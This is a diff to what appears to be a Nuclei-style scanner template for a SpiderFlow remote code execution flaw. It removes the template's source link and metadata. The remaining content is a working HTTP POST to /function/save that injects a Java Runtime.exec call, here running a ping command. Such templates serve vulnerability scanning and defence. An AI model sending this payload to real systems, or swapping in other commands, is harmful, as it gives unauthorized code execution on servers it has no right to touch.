@@ -3,12 +3,8 @@ info:
   name: SpiderFlow RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lxn35ldgpdfxd3m0'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lxn35ldgpdfxd3m0
-    fofa: 暂无
 http:
 - raw:
   - 'POST /function/save HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Connection: close
-
-
 
 
     id=1&name=cmd&parameter=rce&script=%7DJava.type(''java.lang.Runtime'').getRuntime().exec(''ping+baidu.com'')%3B%7B
